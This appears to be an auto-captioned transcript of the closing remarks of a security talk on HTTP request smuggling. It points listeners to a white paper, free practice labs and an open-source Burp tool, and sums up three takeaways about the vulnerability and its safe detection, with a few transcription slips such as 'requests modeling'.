there's loads of resources  online for this there's the white paper  check that out we've also for the first  time released a a whole bunch of free  online labs, so you can practice  exploiting this vulnerability on replica  real systems just get familiar with that  with it without the carnage that you get  when you try and exploit this on a real  site ,also the source code for the tool  is online that works in the free version  of burp as well as the pro version, and  both of the references are both well  worth checking out, the three key things to take away are  that HTTP requests modeling is a real  vulnerability,  doesn't matter if it's scary you can  still get hacked with it. HTTP 1.1  one point is a security critical function  and it should always be audited in web  servers before you even think about  using them. and detection of requests  smuggling doesn't have to be dangerous. 